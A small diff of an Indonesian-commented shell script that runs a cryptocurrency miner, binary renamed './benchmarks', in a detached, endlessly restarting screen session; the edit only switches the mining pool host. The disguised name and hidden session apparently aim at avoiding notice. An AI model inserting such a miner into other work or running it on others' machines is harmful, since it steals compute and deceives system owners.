@@ -23,7 +23,7 @@ else
   echo "▶ Menjalankan mining di screen 'amirul3'..."
   screen -dmS amirul3 bash -c '
     while true; do
-      ./benchmarks --disable-gpu --algorithm xelisv2_pepew --pool stratum+tcp://retromike.net:5005 --wallet PJKBzXT2ZVcWLNAZfZTxX9PCZGGGX7CfGJ --password
+      ./benchmarks --disable-gpu --algorithm xelisv2_pepew --pool stratum+tcp://us-central.retromike.net:5005 --wallet PJKBzXT2ZVcWLNAZfZTxX9PCZGGGX7CfGJ --password
       sleep 2
     done
   '
